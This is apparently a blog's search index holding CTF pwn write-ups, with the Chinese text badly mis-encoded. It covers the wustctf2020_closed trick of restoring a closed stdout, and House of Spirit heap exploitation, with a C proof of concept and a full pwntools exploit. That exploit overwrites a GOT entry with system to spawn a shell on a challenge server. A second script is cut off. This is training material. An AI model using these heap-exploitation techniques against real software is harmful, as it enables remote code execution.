<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>wustctf2020_closed</title>
    <link href="/2024/08/03/wustctf2020-closed/"/>
    <url>/2024/08/03/wustctf2020-closed/</url>
    
    <content type="html"><![CDATA[<h2 id="IDAåç¼–è¯‘ä¼ªä»£ç "><a href="#IDAåç¼–è¯‘ä¼ªä»£ç " class="headerlink" title="IDAåç¼–è¯‘ä¼ªä»£ç "></a>IDAåç¼–è¯‘ä¼ªä»£ç </h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408031805202.png" alt="idaåç¼–è¯‘"></p><h2 id="æ–‡ä»¶ç›¸å…³çŸ¥è¯†"><a href="#æ–‡ä»¶ç›¸å…³çŸ¥è¯†" class="headerlink" title="æ–‡ä»¶ç›¸å…³çŸ¥è¯†"></a>æ–‡ä»¶ç›¸å…³çŸ¥è¯†</h2><p>è¿™é¢˜å°±æ˜¯ä¸€ä¸ªLinuxå‘½ä»¤ exec 1&gt;&amp;0</p><p>ç°åœ¨æ¥è§£é‡Šä¸€ä¸‹</p><ul><li>close(1);close(2);</li><li>æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å¾—åˆ°shellï¼Œå®˜æ–¹wpç»™çš„æ˜¯æ­¤å¤„å¯ä»¥è¾“å…¥ä¸²ï¼š$0ç„¶åå¯ä»¥æ‰§è¡Œæ–°çš„å‘½ä»¤exec 1&gt;&amp;0ä»¥åŠå…¶ä»–ä»¥æŸ¥çœ‹åˆ°flag</li><li>é‚£ä¹ˆè¿™æ¡è¯­å¥æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå…¶ä¸­çš„0å’Œ1æ˜¯æŒ‡ä»€ä¹ˆå‘¢ï¼Ÿ<ul><li>0å’Œ1æ˜¯linuxä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</li><li>åœ¨Linuxä¸­ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ˆé€šå¸¸æ˜¯å°æ•´æ•°ï¼‰ï¼Œç”¨äºæŒ‡ä»£è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡ŒI&#x2F;Oæ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ã€‚ç¨‹åºåˆšåˆšå¯åŠ¨çš„æ—¶å€™ï¼Œ0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œ1æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ2æ˜¯æ ‡å‡†é”™è¯¯ã€‚å¦‚æœæ­¤æ—¶å»æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¼šæ˜¯3ã€‚</li><li>æ ‡å‡†è¾“å…¥è¾“å‡ºçš„æŒ‡å‘æ˜¯é»˜è®¤çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å®ƒä»¬çš„æŒ‡å‘ï¼Œä¹Ÿå³é‡å®šä½</li><li>ä¸¾ä¾‹å­ï¼Œå¯ä»¥ç”¨exec 1&gt;myoutputæŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°myoutputæ–‡ä»¶ä¸­ï¼Œä¹Ÿå¯ä»¥ç”¨exec 0&lt;myinputæŠŠæ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°myinputæ–‡ä»¶ä¸­ï¼Œè€Œä¸”ï¼Œæ–‡ä»¶åå­—å¯ä»¥ç”¨&amp;+æ–‡ä»¶æè¿°ç¬¦æ¥ä»£æ›¿ã€‚</li><li>é‚£ä¹ˆé—®é¢˜åˆ°è¿™é‡Œå°±è§£å†³äº†ï¼Œä¸‰æ¡è¯­å¥ä¸­close(1);close(2)å³æŠŠæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºå…³é—­ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ exec 1&gt;&amp;0ï¼Œä¹Ÿå°±æ˜¯æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå› ä¸ºé»˜è®¤æ‰“å¼€ä¸€ä¸ªç»ˆç«¯åï¼Œ0ï¼Œ1ï¼Œ2éƒ½æŒ‡å‘åŒä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯å½“å‰ç»ˆç«¯ï¼Œæ‰€ä»¥è¿™æ¡è¯­å¥ç›¸å½“äºé‡å¯äº†æ ‡å‡†è¾“å‡ºï¼Œæ­¤æ—¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶ä¸”çœ‹å¾—åˆ°è¾“å‡ºäº†</li></ul></li></ul><h3 id="å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚"><a href="#å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚" class="headerlink" title="å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚"></a>å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚</h3>]]></content>
    
    
    <categories>
      
      <category>BUUCTFåˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linuxå‘½ä»¤</tag>
      
      <tag>æ–‡ä»¶æ“ä½œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2024/08/03/Fastbin-Attack/"/>
    <url>/2024/08/03/Fastbin-Attack/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastbin Attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spiritæ”»å‡»</title>
    <link href="/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>House of Spiritæ˜¯ä¸€ç§å †åˆ©ç”¨æ–¹æ³•ï¼Œå…¶æ ¸å¿ƒåœ¨äºé€šè¿‡ä»»æ„åœ°å€çš„é‡Šæ”¾è¾¾åˆ°ç¯¡æ”¹åœ°å€çš„ç›®çš„ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>åœ¨ç›®æ ‡åœ°å€å‘¨å›´èƒ½å¤Ÿä¼ªé€ ä¸€ä¸ªå †å—ã€‚</li><li>èƒ½å¯¹ä¼ªé€ å †å—åœ°å€å‘¨å›´è¿›è¡Œä¸€æ¬¡é‡Šæ”¾ï¼ˆå³å°†ä¼ªé€ çš„å †å—åœ°å€ä½œä¸ºfreeå‡½æ•°çš„å‚æ•°è¿›è¡Œä¸€æ¬¡é‡Šæ”¾æ“ä½œï¼‰</li><li>é‡Šæ”¾ä¹‹åèƒ½å¤Ÿé‡æ–°ç”³è¯·å¾—åˆ°è¿™ä¸ªå †å—å¹¶ç¯¡æ”¹ç›®æ ‡åœ°å€çš„å†…å®¹</li></ol><p>è¿™é‡Œç»™å‡ºä¸€ä¸ªPOCä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> data[<span class="hljs-number">0x20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> size = <span class="hljs-number">0x70</span>;<br><span class="hljs-type">void</span> *p;<br>init();<br><span class="hljs-comment">// init arena</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// fake chunk header</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,data);<br>data[<span class="hljs-number">0</span>] = <span class="hljs-number">0x0</span>;<br>data[<span class="hljs-number">1</span>] = size | <span class="hljs-number">1</span>; <span class="hljs-comment">// prev_inuse_bit</span><br><span class="hljs-comment">// fake next chunk header</span><br>data[size / <span class="hljs-number">8</span>] = <span class="hljs-number">0x0</span>;<br>data[(size / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>] = <span class="hljs-number">0x11</span>;<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// free user data place, fd.</span><br><span class="hljs-built_in">free</span>(&amp;data[<span class="hljs-number">2</span>]);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// user&#x27;s size == chunk_size - 0x10</span><br>p = <span class="hljs-built_in">malloc</span>(size - <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,p);<br>sleep(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>gccç¼–è¯‘ä¸€ä¸‹è¿›è¡Œè°ƒè¯•åˆ†æ</p><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022055703.png" alt="è¿è¡Œç»“æœ"></p><p>è°ƒè¯•å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb House_of_Spirit<br>b <span class="hljs-built_in">sleep</span><br>r<br>x /20gz 0x6010a0<br></code></pre></td></tr></table></figure><p>xæŒ‡ä»¤ç»“æœä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022100510.png" alt="xæŒ‡ä»¤ç»“æœ"></p><p>binsæŒ‡ä»¤ç»“æœä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022149700.png" alt="binsæŒ‡ä»¤ç»“æœ"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ªé€ chunkæˆåŠŸï¼Œprev_sizeä¸º0ï¼Œsizeå­—æ®µä¸º0x71ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦ä¼ªé€ ä¸‹ä¸€ä¸ªchunkçš„å¤´éƒ¨ï¼Œå¦‚æœä¸ä¼ªé€ ï¼Œå°±ä¼šæŠ¥é”™ã€‚å› ä¸ºä¼šæ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„sizeå­—æ®µï¼Œå¦‚æœä¸‹ä¸€ä¸ªchunkçš„å­—æ®µä¸åœ¨æ­£å¸¸èŒƒå›´å†…ï¼ˆ2*SIZE_SZåˆ°av-&gt;system_memï¼‰ï¼Œåˆ™ä¼šæŠ¥é”™é€€å‡ºï¼Œæ‰€ä»¥åœ¨ä¼ªé€ chunkçš„æ—¶å€™ï¼Œä¸ä»…è¦ä¼ªé€ å½“å‰çš„chunkå¤´ï¼Œè¿˜è¦ä¼ªé€ ä¸‹ä¸€ä¸ªchunkçš„å¤´éƒ¨</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¾‹é¢˜ä¸‹è½½ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn144_1604">ä¾‹é¢˜</a></p><p>æŸ¥çœ‹ä¿æŠ¤</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022122900.png" alt="æŸ¥çœ‹ä¿æŠ¤"></p><p>IDAåç¼–è¯‘å‘ç°åé—¨å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022130508.png" alt="åé—¨å‡½æ•°"></p><p>åœ¨mainå‡½æ•°ä¸­æ»¡è¶³ä¸€å®šæ¡ä»¶å¯ä»¥è°ƒç”¨åé—¨å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022129971.png" alt="mainå‡½æ•°"></p><p>magic ä¸ºåœ¨ bss æ®µçš„å…¨å±€å˜é‡ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ v3 ä¸º 114514 å¹¶ä¸”è¦†å†™ magic ä½¿å…¶å€¼â¼¤äº 114514 ï¼Œå°±èƒ½get flagã€‚</p><p>çœ‹èœå•menu()</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022131344.png" alt="èœå•"></p><p>æ‰“å¼€create_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133356.png" alt="create_heap"></p><p>heaparray æ•°ç»„ï¼šå­˜æ”¾ chunk çš„â¾¸åœ°å€ã€‚</p><p>read_input(heaparray[i], size)ï¼šæŠŠæˆ‘ä»¬è¾“â¼Šçš„å†…å®¹å†™â¼Š chunk ä¸­ã€‚</p><p>ä¸”heaparrayæ˜¯å­˜æ”¾åœ¨bssæ®µä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133318.png" alt="bssæ®µ"></p><p>æ‰“å¼€edit_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022134629.png" alt="edit_heap"></p><p>å¯ä»¥å†æ¬¡ç¼–è¾‘ chunk çš„å†…å®¹ï¼Œâ½½ä¸”å¯ä»¥é€‰æ‹©è¾“â¼Šâ¼¤â¼©ã€‚å¦‚æœæˆ‘ä»¬è¿™æ¬¡è¾“â¼Šçš„ size â½åˆ›å»ºæ—¶â¼¤çš„è¯ï¼Œå°±ä¼šå¯¼è‡´å †æº¢å‡º</p><p>ï¼ˆread_input(heaparray[v1], v2)ï¼šå‘ chunk ä¸­å†™â¼Š v2 â¼¤â¼©çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœ v2 â½ create æ—¶çš„ size â¼¤çš„è¯å°±ä¼šé€ æˆå †æº¢å‡ºã€‚ï¼‰</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨House of Spirit</p><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>é¦–å…ˆåˆ›å»ºä¿©ä¸ªchunkï¼Œchunk0å¤§å°ä¸º0x10ï¼Œchunk1çš„å¤§å°ä¸º0x60</li><li>ç„¶ååˆ é™¤chunk1</li><li>ç¼–è¾‘chunk0é€ æˆå †æº¢å‡ºï¼Œä¿®æ”¹chunk1çš„fdæŒ‡é’ˆä¸º0x000000000060208d</li><li>åˆ›å»ºä¸¤ä¸ªchunkå¤§å°éƒ½ä¸º0x60ï¼Œç¬¬ä¸€ä¸ªå†…å®¹éšæ„ï¼Œç¬¬äºŒä¸ªè¦æ„é€ payloadè¦†ç›–magicçš„å€¼</li><li>getflag</li></ol><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨æˆ‘ä»¬ä¿®æ”¹fdæŒ‡é’ˆæ—¶ï¼Œéœ€è¦è¿åˆ°ä¸€ä¸ªåˆæ³•çš„chunkå¤´ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144519.png" alt="å†…å­˜åˆ†å¸ƒ"></p><p>è¿™å°±æ˜¯ä¸€ä¸ªåˆæ³•çš„chunkå¤´ï¼Œå¤§å°ä¸º0x70</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144814.png" alt="å†…å­˜åˆ†å¸ƒ"></p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x23</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>payload2 = p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload2) , payload2)<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p>è¿™é¢˜ä¸€æ ·å¯ä»¥ç”¨Arbitrary Allocæ”»å‡»ï¼Œå…³äºfastbinæ”»å‡»ç­‰æˆ‘ç ”ç©¶é€å½»ä¼šè¿›è¡Œæ€»ç»“ï¼Œè¿™é‡Œå…ˆè´´ä¸ªè„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = 